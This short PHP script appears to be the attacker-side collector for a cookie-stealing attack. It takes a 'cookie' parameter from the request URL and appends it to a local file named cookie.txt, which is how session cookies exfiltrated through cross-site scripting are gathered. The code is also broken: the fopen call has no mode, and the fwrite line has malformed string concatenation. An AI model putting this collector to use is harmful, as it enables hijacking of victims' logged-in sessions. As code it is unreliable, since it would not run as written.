<?php

$cookie = $_GET['cookie'];
$f = fopen('cookie.txt');
fwrite($f, "cookie: "$cookie ' ');






?>
